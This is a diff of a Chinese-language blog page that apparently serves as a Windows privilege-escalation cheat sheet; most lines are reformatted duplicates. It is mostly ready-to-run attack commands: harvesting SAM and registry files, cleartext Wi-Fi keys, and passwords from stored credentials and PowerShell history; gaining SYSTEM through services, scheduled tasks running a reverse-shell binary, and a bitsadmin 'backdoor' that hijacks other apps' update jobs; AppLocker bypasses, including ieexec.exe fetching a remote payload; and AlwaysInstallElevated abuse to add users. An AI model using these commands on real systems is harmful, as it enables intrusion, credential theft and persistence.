-%WINDIR%\debug\NetSetup.log
-%WINDIR%\repair\sam
-%WINDIR%\repair\system
-%WINDIR%\repair\software, %WINDIR%\repair\security
-%WINDIR%\iis6.log
-%WINDIR%\system32\config\AppEvent.Evt
-%WINDIR%\system32\config\SecEvent.Evt
-%WINDIR%\system32\config\default.sav
-%WINDIR%\system32\config\security.sav
-%WINDIR%\system32\config\software.sav
-%WINDIR%\system32\config\system.sav
-%WINDIR%\system32\CCM\logs\*.log
-%USERPROFILE%\ntuser.dat
-%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
-%WINDIR%\System32\drivers\etc\hosts
-C:\ProgramData\Configs\*
-C:\Program Files\Windows PowerShell\*
-dir c:*vnc.ini /s /b
-dir c:*ultravnc.ini /s /b
-
-7）Wifi密码查找
-
-netsh wlan show profile   # AP SSID
-
-netsh wlan show profile &lt;SSID&gt; key=clear  # Cleartext Pass
-
-cls &amp; echo. &amp; for /f &quot;tokens=4 delims=: &quot; %a in (&#39;netsh wlan show profiles ^| find &quot;Profile &quot;&#39;) do @echo off &gt; nul &amp; (netsh wlan show profiles name=%a key=clear | findstr &quot;SSID Cipher Content&quot; | find /v &quot;Number&quot; &amp; echo.) &amp; @echo on
-
-8）粘贴版密码
-
-所在位置：C:\Users\&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
-
-9）存储用户密码查看
-
-rundll32 keymgr,KRShowKeyMgr
-
-10）Powershell历史命令
-
-关闭命令：Set-PSReadlineOption -HistorySaveStyle SaveNothing
-
-type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
-type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
-type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-cat (Get-PSReadlineOption).HistorySavePath
-cat (Get-PSReadlineOption).HistorySavePath | sls passw
-
-11）数据流密码获取
-
-PS &gt; Get-Item -path flag.txt -Stream *
-PS &gt; Get-Content -path flag.txt -Stream Flag
-</code></pre>
-<h3 id="3-进程-x2F-服务信息"><a href="#3-进程-x2F-服务信息" class="headerlink" title="3. 进程&#x2F;服务信息"></a>3. 进程&#x2F;服务信息</h3><pre><code>1）查看运行进程
-
-tasklist /v
-net start
-sc query
-Get-Service
-Get-Process
-Get-WmiObject -Query &quot;Select * from Win32_Process&quot; | where &#123;$_.Name -notlike &quot;svchost*&quot;&#125; | Select Name, Handle, @&#123;Label=&quot;Owner&quot;;Expression=&#123;$_.GetOwner().User&#125;&#125; | ft -AutoSize
-
-2）查看system服务进程
-
-tasklist /v /fi &quot;username eq system&quot;
-
-3）列举已安装程序
-
-Get-ChildItem &#39;C:\Program Files&#39;, &#39;C:\Program Files (x86)&#39; | ft Parent,Name,LastWriteTime
-Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
-
-4）列举services
-
-net start
-wmic service list brief
-tasklist /SVC
-
-5）列举计划任务
-
-schtasks /query /fo LIST 2&gt;nul | findstr TaskName
-schtasks /query /fo LIST /v &gt; schtasks.txt; cat schtask.txt | grep &quot;SYSTEM\|Task To Run&quot; | grep -B 1 SYSTEM
-Get-ScheduledTask | where &#123;$_.TaskPath -notlike &quot;\Microsoft*&quot;&#125; | ft TaskName,TaskPath,State
-
-6）查看自启动任务
-
-wmic startup get caption,command
-reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
-reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
-dir &quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot;
-dir &quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot;
-</code></pre>
 <h2 id="0x01-通过服务创建提权"><a href="#0x01-通过服务创建提权" class="headerlink" title="0x01 通过服务创建提权"></a>0x01 通过服务创建提权</h2><p>介绍几种从admin权限提权到system权限的方法，本质上是采用了“劫持启动”的思想，通过创建一个系统任务，劫持系统以一个system权限来执行任意的目的</p>
-<h3 id="1-使用sc命令"><a href="#1-使用sc命令" class="headerlink" title="1. 使用sc命令"></a>1. 使用sc命令</h3><pre><code>sc Create TestService1 binPath= &quot;cmd /c start&quot; type= own type= interact
-sc start TestService1
-</code></pre>
+<h3 id="1-使用sc命令"><a href="#1-使用sc命令" class="headerlink" title="1. 使用sc命令"></a>1. 使用sc命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc Create TestService1 binPath= &quot;cmd /c start&quot; type= own type= interact</span><br><span class="line">sc start TestService1</span><br></pre></td></tr></table></figure>
+
 <p>创建服务后，启动该服务，会遇到报错，点击“查看消息”可以得到另一个类似screen的会话界面中，获得system权限</p>
 <p>注意：通过sc创建服务必须要有administrator权限，普通账户（非administrators组）无法创建服务</p>
 <h3 id="2-通过计划任务"><a href="#2-通过计划任务" class="headerlink" title="2. 通过计划任务"></a>2. 通过计划任务</h3><p>使用at命令（默认以system权限启动）：</p>
-<pre><code># Create a recurring task to execute every day at a specific time.
-C:\Windows\System32\at.exe at 10:00 /interactive /every:m,t,w,th,f,s,su C:\Windows\System32\revshell.exe
-</code></pre>
-<p>at启动的任务默认是非交互模式，如果希望以交互模式启动新进程和指令，创建服务，以system权限启动：</p>
-<pre><code>schtasks /Create /TN TestService2 /SC DAILY /ST 00:36 /TR notepad.exe /RU SYSTEM可以使用schtasks命令
-</code></pre>
-<p>查看服务状态：</p>
-<pre><code>schtasks /Query /TN TestService2
-</code></pre>
-<p>删除服务：</p>
-<pre><code>schtasks /Delete /TN TestService2 /F
-</code></pre>
-<h3 id="3-利用psexec"><a href="#3-利用psexec" class="headerlink" title="3. 利用psexec"></a>3. 利用psexec</h3><p>psexec.exe可以被用来向远程服务器执行程序和指令，也可以被用在本地执行进程指令</p>
-<pre><code>psexec.exe -accepteula -s -i -d notepad.exe
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Create a recurring task to execute every day at a specific time.</span><br><span class="line">C:\Windows\System32\at.exe at 10:00 /interactive /every:m,t,w,th,f,s,su C:\Windows\System32\revshell.exe</span><br></pre></td></tr></table></figure>
 
--s    Run the remote process in the System account. 
--i    Run the program so that it interacts with the desktop of the specified session on the remote system. If no session is specified the process runs in the console session.
--d    Don&#39;t wait for process to terminate (non-interactive).
-</code></pre>
+<p>at启动的任务默认是非交互模式，如果希望以交互模式启动新进程和指令，创建服务，以system权限启动：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /TN TestService2 /SC DAILY /ST 00:36 /TR notepad.exe /RU SYSTEM可以使用schtasks命令</span><br></pre></td></tr></table></figure>
+
+<p>查看服务状态：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Query /TN TestService2</span><br></pre></td></tr></table></figure>
+
+<p>删除服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Delete /TN TestService2 /F</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-利用psexec"><a href="#3-利用psexec" class="headerlink" title="3. 利用psexec"></a>3. 利用psexec</h3><p>psexec.exe可以被用来向远程服务器执行程序和指令，也可以被用在本地执行进程指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula -s -i -d notepad.exe</span><br><span class="line"></span><br><span class="line">-s    Run the remote process in the System account. </span><br><span class="line">-i    Run the program so that it interacts with the desktop of the specified session on the remote system. If no session is specified the process runs in the console session.</span><br><span class="line">-d    Don&#x27;t wait for process to terminate (non-interactive).</span><br></pre></td></tr></table></figure>
+
 <p>注意：使用psexec会创建PSEXESVC服务，产生日志Event 4697、Event 7045、Event 4624和Event 4652，所以需要administrator权限启动</p>
 <h3 id="4-利用win32-API创建服务"><a href="#4-利用win32-API创建服务" class="headerlink" title="4. 利用win32 API创建服务"></a>4. 利用win32 API创建服务</h3><p>利用新建服务的进程权限都是system这一优势获得一个system的shell</p>
-<pre><code>1. 新建一个services stup exe，实现windows service的基本接口，在start逻辑里负责向named pipe中随意写入一些bytes，目的是激活named pipe
-2. 真正的提权exe，要负责创建一个named pipe，同时连接上去，和services stup exe互通
-3. 通过ImpersonateNamedPipeClient、DuplicateTokenEx从services stup exe拷贝出system token
-4. 调用CreateProcessAsUser基于已获得的token创建一个新cmd.exe shell进程，进行本地提权
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 新建一个services stup exe，实现windows service的基本接口，在start逻辑里负责向named pipe中随意写入一些bytes，目的是激活named pipe</span><br><span class="line">2. 真正的提权exe，要负责创建一个named pipe，同时连接上去，和services stup exe互通</span><br><span class="line">3. 通过ImpersonateNamedPipeClient、DuplicateTokenEx从services stup exe拷贝出system token</span><br><span class="line">4. 调用CreateProcessAsUser基于已获得的token创建一个新cmd.exe shell进程，进行本地提权</span><br></pre></td></tr></table></figure>
+
 <p><em>refer:</em> <a target="_blank" rel="noopener" href="https://github.com/xpn/getsystem-offline">https://github.com/xpn/getsystem-offline</a></p>
 <h2 id="0x02-利用bitadmins提取权"><a href="#0x02-利用bitadmins提取权" class="headerlink" title="0x02. 利用bitadmins提取权"></a>0x02. 利用bitadmins提取权</h2><p>bitadmins是用于文件下载的windows系统内置指令，但同时它还具有另一个方便的能力就是：“下载完毕后触发一次执行执行回调，并且是system权限”</p>
 <p><strong>1) 借助bitadmins回调执行功能启动新进程，跳过文件下载环节</strong></p>
 <p>bitadmins只有在文件下载成功后，才能接着执行其中的cmd命令，但是为了缩短执行命令的时间，减小下载文件的流量，可以把文件设置为本地文件，这样就可以跳过文件下载的环节，直接执行一个指令</p>
-<pre><code>bitsadmin /create backdoor
-bitsadmin /addfile backdoor %comspec%  %temp%\cmd.exe
-bitsadmin.exe /SetNotifyCmdLine backdoor &quot;%COMSPEC%&quot; &quot;cmd.exe /c regedit.exe&quot; 
-bitsadmin /Resume backdoor
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /create backdoor</span><br><span class="line">bitsadmin /addfile backdoor %comspec%  %temp%\cmd.exe</span><br><span class="line">bitsadmin.exe /SetNotifyCmdLine backdoor &quot;%COMSPEC%&quot; &quot;cmd.exe /c regedit.exe&quot; </span><br><span class="line">bitsadmin /Resume backdoor</span><br></pre></td></tr></table></figure>
+
 <p><strong>2) 劫持其他应用的bitadmins任务，向其GetNotifyCmdLine中植入恶意代码</strong></p>
 <p>bitadmins是系统updates底层使用的下载支持服务，除此之外，像chrome这种应用也会使用bitadmins进行应用更新，因此，可以通过劫持这些应用的回调GetNotifyCmdLine，向其中注入定制的代码，这样，每当应用进行升级或升级检查的时候，就会触发evil code</p>
-<pre><code> 查看现在都有哪些应用创建了bisadmins任务
-bitsadmin /list /allusers /verbose
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> 查看现在都有哪些应用创建了bisadmins任务</span><br><span class="line">bitsadmin /list /allusers /verbose</span><br><span class="line"></span><br><span class="line">bitsadmin /GetNotifyCmdLine &#123;B4FF6F6E-E980-4F33-9AB6-A510E1F03044&#125;</span><br><span class="line"># 发现回调任务为空</span><br><span class="line"># the notification command line is &#x27;NULL&#x27; &#x27;NULL&#x27;</span><br><span class="line"># 给任务添加GetNotifyCmdLine</span><br><span class="line">bitsadmin.exe /SetNotifyCmdLine &#123;B4FF6F6E-E980-4F33-9AB6-A510E1F03044&#125; &quot;%COMSPEC%&quot; &quot;cmd.exe /c calc.exe&quot; </span><br><span class="line"> </span><br><span class="line"># 查看GUID</span><br><span class="line">bitsadmin /GetNotifyCmdLine &#123;B4FF6F6E-E980-4F33-9AB6-A510E1F03044&#125;</span><br></pre></td></tr></table></figure>
 
-bitsadmin /GetNotifyCmdLine &#123;B4FF6F6E-E980-4F33-9AB6-A510E1F03044&#125;
-# 发现回调任务为空
-# the notification command line is &#39;NULL&#39; &#39;NULL&#39;
-# 给任务添加GetNotifyCmdLine
-bitsadmin.exe /SetNotifyCmdLine &#123;B4FF6F6E-E980-4F33-9AB6-A510E1F03044&#125; &quot;%COMSPEC%&quot; &quot;cmd.exe /c calc.exe&quot; 
- 
-# 查看GUID
-bitsadmin /GetNotifyCmdLine &#123;B4FF6F6E-E980-4F33-9AB6-A510E1F03044&#125;
-</code></pre>
 <p><em>refer:</em></p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://blog.xpnsec.com/becoming-system/">https://blog.xpnsec.com/becoming-system/</a></li>
 <li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec">https://learn.microsoft.com/en-us/sysinternals/downloads/psexec</a></li>
 </ul>
 <h2 id="0x03-绕过AppLocker限制提权"><a href="#0x03-绕过AppLocker限制提权" class="headerlink" title="0x03 绕过AppLocker限制提权"></a>0x03 绕过AppLocker限制提权</h2><p>AppLocker本质是一个“黑&#x2F;白名单机制框架”，相比黑名单，白名单是它的主流用法，AppLocker 为管理员提供指定哪些用户可以运行特定应用程序的能力。AppLocker 允许管理员控制下列类型的应用程序：</p>
-<pre><code>1) 可执行文件
-.exe
-.com
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1) 可执行文件</span><br><span class="line">.exe</span><br><span class="line">.com</span><br><span class="line"></span><br><span class="line">2) 脚本文件</span><br><span class="line">.js</span><br><span class="line">.ps1</span><br><span class="line">.vbs</span><br><span class="line">.cmd</span><br><span class="line">.bat</span><br><span class="line"></span><br><span class="line">3) Windows Installer 文件</span><br><span class="line">.msi</span><br><span class="line">.msp</span><br><span class="line"></span><br><span class="line">4) DLL 文件</span><br><span class="line">.dll</span><br><span class="line">.ocx</span><br></pre></td></tr></table></figure>
 
-2) 脚本文件
-.js
-.ps1
-.vbs
-.cmd
-.bat
+<h3 id="1-AppLocker局限性"><a href="#1-AppLocker局限性" class="headerlink" title="1. AppLocker局限性"></a>1. AppLocker局限性</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1) AppLocker无法控制内存中正在运行的进程：利用一些可信的进程或使用反射注入技术就可以做到绕过</span><br><span class="line"></span><br><span class="line">2) DLL劫持: 除非有严格的DLL AppLocker规则，否则你就可以DLL劫持信任的应用程序</span><br><span class="line"></span><br><span class="line">3) 不能控制Office宏</span><br><span class="line"></span><br><span class="line">4) 不能控制HTML应用程序(.hta应用)</span><br><span class="line"></span><br><span class="line">5) 白名单控制粒度过大导致绕过</span><br><span class="line"></span><br><span class="line">例如配置了只允许C:/Windows/目录下的进程执行，但是黑客有可能有权限向这个目录下写入自己的恶意程序，从而绕过AppLocker限制启动新进程。可以用这个脚本来探测C:\Windows\*下可写目录的可执行情况</span><br><span class="line"></span><br><span class="line">6) AppLocker是针对非管理员账户的应用程序实行限制的</span><br><span class="line"></span><br><span class="line">如果有本地管理员权限，你可以添加一个本地规则允许所有的东西都可以执行。这就会重写所有基于域的策略</span><br><span class="line"></span><br><span class="line">7) 利用系统原生白名单进程</span><br><span class="line"></span><br><span class="line">通过rundll32调用javascript代码并执行任意代码</span><br><span class="line"></span><br><span class="line">通过regsvc32.exe执行sct代码</span><br></pre></td></tr></table></figure>
 
-3) Windows Installer 文件
-.msi
-.msp
+<h3 id="2-绕过Applocker方式"><a href="#2-绕过Applocker方式" class="headerlink" title="2. 绕过Applocker方式"></a>2. 绕过Applocker方式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">1）Placing files in writeable paths</span><br><span class="line"></span><br><span class="line">C:\Windows\Tasks </span><br><span class="line">C:\Windows\Temp </span><br><span class="line">C:\windows\tracing</span><br><span class="line">C:\Windows\Registration\CRMLog</span><br><span class="line">C:\Windows\System32\FxsTmp</span><br><span class="line">C:\Windows\System32\com\dmp</span><br><span class="line">C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys</span><br><span class="line">C:\Windows\System32\spool\PRINTERS</span><br><span class="line">C:\Windows\System32\spool\SERVERS</span><br><span class="line">C:\Windows\System32\spool\drivers\color</span><br><span class="line">C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter</span><br><span class="line">C:\Windows\SysWOW64\FxsTmp</span><br><span class="line">C:\Windows\SysWOW64\com\dmp</span><br><span class="line">C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter</span><br><span class="line">C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System</span><br><span class="line"></span><br><span class="line">2) DXCap.exe </span><br><span class="line"></span><br><span class="line">DXCap.exe -c C:\Windows\System32\notepad.exe</span><br><span class="line"></span><br><span class="line">3) Register-cimprovider.exe</span><br><span class="line"></span><br><span class="line">Register-cimprovider -path &quot;C:\bypass\evil.dll&quot;</span><br><span class="line"></span><br><span class="line">4) Fsi.exe</span><br><span class="line"></span><br><span class="line">fsi.exe c:\folder\d.fscript</span><br><span class="line"># Use fsi.exe to run unsigned F# code.</span><br><span class="line"></span><br><span class="line">5) msconfig</span><br><span class="line"></span><br><span class="line">msconfig即系统配置实用程序，是Microsoft System Configuration的缩写。</span><br><span class="line"></span><br><span class="line">在“C:\Windows\System32\mscfgtlc.xml”新建xml文件，</span><br><span class="line"></span><br><span class="line">    &lt;?xml  version=&quot;1.0&quot; ?&gt;</span><br><span class="line">    &lt;MSCONFIGTOOLS&gt;</span><br><span class="line">    &lt;a NAME=&quot;LOLBin&quot; PATH=&quot;%windir%\system32\WindowsPowerShell\v1.0\powershell.exe&quot;</span><br><span class="line">    DEFAULT_OPT=&quot;-command calc.exe &quot; </span><br><span class="line">    HELP=&quot;LOLBin MSCONFIGTOOLS&quot;/&gt;</span><br><span class="line">    &lt;/MSCONFIGTOOLS&gt;</span><br><span class="line"></span><br><span class="line">启动CMD ：msconfig -5</span><br><span class="line"></span><br><span class="line">找到LOLBin一栏 点击启动 触发条件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">6）Ieexec.exe</span><br><span class="line"></span><br><span class="line">IEExec.exe应用程序是一个未记录的Microsoft.NET框架应用程序，它包含在.NET框架中。攻击者可以使用IEExec.exe应用程序作为主机来运行其他托管应用程序</span><br><span class="line"></span><br><span class="line">ieexec.exe http://x.x.x.x:8080/bypass.exe</span><br></pre></td></tr></table></figure>
 
-4) DLL 文件
-.dll
-.ocx
-</code></pre>
-<h3 id="1-AppLocker局限性"><a href="#1-AppLocker局限性" class="headerlink" title="1. AppLocker局限性"></a>1. AppLocker局限性</h3><pre><code>1) AppLocker无法控制内存中正在运行的进程：利用一些可信的进程或使用反射注入技术就可以做到绕过
-
-2) DLL劫持: 除非有严格的DLL AppLocker规则，否则你就可以DLL劫持信任的应用程序
-
-3) 不能控制Office宏
-
-4) 不能控制HTML应用程序(.hta应用)
-
-5) 白名单控制粒度过大导致绕过
-
-例如配置了只允许C:/Windows/目录下的进程执行，但是黑客有可能有权限向这个目录下写入自己的恶意程序，从而绕过AppLocker限制启动新进程。可以用这个脚本来探测C:\Windows\*下可写目录的可执行情况
-
-6) AppLocker是针对非管理员账户的应用程序实行限制的
-
-如果有本地管理员权限，你可以添加一个本地规则允许所有的东西都可以执行。这就会重写所有基于域的策略
-
-7) 利用系统原生白名单进程
-
-通过rundll32调用javascript代码并执行任意代码
-
-通过regsvc32.exe执行sct代码
-</code></pre>
-<h3 id="2-绕过Applocker方式"><a href="#2-绕过Applocker方式" class="headerlink" title="2. 绕过Applocker方式"></a>2. 绕过Applocker方式</h3><pre><code>1）Placing files in writeable paths
-
-C:\Windows\Tasks 
-C:\Windows\Temp 
-C:\windows\tracing
-C:\Windows\Registration\CRMLog
-C:\Windows\System32\FxsTmp
-C:\Windows\System32\com\dmp
-C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
-C:\Windows\System32\spool\PRINTERS
-C:\Windows\System32\spool\SERVERS
-C:\Windows\System32\spool\drivers\color
-C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
-C:\Windows\SysWOW64\FxsTmp
-C:\Windows\SysWOW64\com\dmp
-C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
-C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
-
-2) DXCap.exe 
-
-DXCap.exe -c C:\Windows\System32\notepad.exe
-
-3) Register-cimprovider.exe
-
-Register-cimprovider -path &quot;C:\bypass\evil.dll&quot;
-
-4) Fsi.exe
-
-fsi.exe c:\folder\d.fscript
-# Use fsi.exe to run unsigned F# code.
-
-5) msconfig
-
-msconfig即系统配置实用程序，是Microsoft System Configuration的缩写。
-
-在“C:\Windows\System32\mscfgtlc.xml”新建xml文件，
-
-    &lt;?xml  version=&quot;1.0&quot; ?&gt;
-    &lt;MSCONFIGTOOLS&gt;
-    &lt;a NAME=&quot;LOLBin&quot; PATH=&quot;%windir%\system32\WindowsPowerShell\v1.0\powershell.exe&quot;
-    DEFAULT_OPT=&quot;-command calc.exe &quot; 
-    HELP=&quot;LOLBin MSCONFIGTOOLS&quot;/&gt;
-    &lt;/MSCONFIGTOOLS&gt;
-
-启动CMD ：msconfig -5
-
-找到LOLBin一栏 点击启动 触发条件
-
-
-6）Ieexec.exe
-
-IEExec.exe应用程序是一个未记录的Microsoft.NET框架应用程序，它包含在.NET框架中。攻击者可以使用IEExec.exe应用程序作为主机来运行其他托管应用程序
-
-ieexec.exe http://x.x.x.x:8080/bypass.exe
-</code></pre>
 <h2 id="0x04-利用组策略提升权限"><a href="#0x04-利用组策略提升权限" class="headerlink" title="0x04 利用组策略提升权限"></a>0x04 利用组策略提升权限</h2><p><strong>开启AlwaysInstallElevated特权安装功能</strong></p>
 <p>开启AlwaysInstallElevated特权安装功能：</p>
 <ul>
@@ -701,288 +316,69 @@ ieexec.exe http://x.x.x.x:8080/bypass.exe
 </li>
 </ul>
 <p>此时会在注册表如下位置自动创建键值：</p>
-<pre><code>[HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”=dword:00000001
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”=dword:00000001</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”=dword:00000001</span><br></pre></td></tr></table></figure>
 
-[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”=dword:00000001
-</code></pre>
 <p>如果获得了对注册表的访问权限，可以通过更改注册表来开启AlwaysInstallElevated（必须同时修改两处注册表键值），进而提升权限</p>
-<pre><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line"></span><br><span class="line"># 值全为1代表开启AlwaysInstallElevated，否则未开启</span><br></pre></td></tr></table></figure>
 
-# 值全为1代表开启AlwaysInstallElevated，否则未开启
-</code></pre>
 <p>然后使用<a target="_blank" rel="noopener" href="https://github.com/LittleHann/PowerSploit/blob/master/Privesc/Privesc.psd1">powerup powershell tookkit</a>生成对应的.msi程序，完成提权添加用户的操作：</p>
-<pre><code># 将Privesc拷贝至&quot;$Env:windir\System32\WindowsPowerShell\v1.0\Modules&quot;
-# 导入moduel: 
-Import-Module Privesc
-# 检查是否开启AlwaysInstallElevated：
-Get-RegistryAlwaysInstallElevated
-# 返回true代表系统开启AlwaysInstallElevated 
-# 利用AlwaysInstallElevated添加用户
-Write-UserAddMSI
-# 运行后生成文件UserAdd.msi
-# 以普通用户权限运行这个UserAdd.msi，成功添加账户 
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 将Privesc拷贝至&quot;$Env:windir\System32\WindowsPowerShell\v1.0\Modules&quot;</span><br><span class="line"># 导入moduel: </span><br><span class="line">Import-Module Privesc</span><br><span class="line"># 检查是否开启AlwaysInstallElevated：</span><br><span class="line">Get-RegistryAlwaysInstallElevated</span><br><span class="line"># 返回true代表系统开启AlwaysInstallElevated </span><br><span class="line"># 利用AlwaysInstallElevated添加用户</span><br><span class="line">Write-UserAddMSI</span><br><span class="line"># 运行后生成文件UserAdd.msi</span><br><span class="line"># 以普通用户权限运行这个UserAdd.msi，成功添加账户 </span><br></pre></td></tr></table></figure>
+
 <h2 id="0x05-绕过UAC提权"><a href="#0x05-绕过UAC提权" class="headerlink" title="0x05 绕过UAC提权"></a>0x05 绕过UAC提权</h2><p>自Windows Vista开始，微软引入了完整性级别概念，用于防止”权限滥用“，其设计模型来自于Biba完整性模型基础上的上不可写，下不可读原则来保护数据完整性，权限由高到低分为：</p>
-<pre><code>1. 系统级(system)
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 系统级(system)</span><br><span class="line"></span><br><span class="line">2. 管理员(High): 在Windows Vista之前的系统，默认创建的管理员账户即对应完整管理员(High)级别，这个级别基本没有限制，导致可以任意添加计划任务，写关键路径，读写关键注册表、创建服务、加载驱动等等</span><br><span class="line"></span><br><span class="line">3. 用户(Medium): 从Windows Vista开始创建的管理员账户均在用户(Medium)级别，当UAC(默认)开启的情况下，这个级别会有很多限制，仅当程序请求管理员权限，或是触发条件则弹窗询问用户授权。</span><br><span class="line"></span><br><span class="line">4. 受限(Low): 受限(Low)被应用于IE浏览器作为保护模式使用，其直接访问网页的进程会通过Host主进程代理操作系统资源，只有在Temp、Temporary、Internet Files、Cookies和Favorites目录下的几个特定低完整性目录可以进行写操作，同时启动其他进程时弹窗询问用户。</span><br></pre></td></tr></table></figure>
 
